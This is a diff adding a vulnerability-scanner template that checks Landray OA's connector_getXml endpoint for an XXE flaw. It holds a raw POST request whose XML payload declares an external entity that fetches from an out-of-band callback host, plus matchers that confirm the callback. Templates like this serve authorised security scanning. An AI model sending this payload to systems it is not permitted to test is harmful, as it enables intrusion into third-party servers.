@@ -1,0 +1,30 @@
+id: landray-connector_getXml-xxe
+
+info:
+  name: 蓝凌OA connector_getXml 存在XXE漏洞
+  author: landray
+  severity: medium
+  tags: landray
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /AddressBook/connector_getdata.aspx/connector_getXml?type=add HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/Xml
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+
+    max-redirects: 3
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
+          - "status_code == 200 || status_code == 400 || status_code == 500"
+          - 'contains(body, "运行时错误")'
+        condition: and
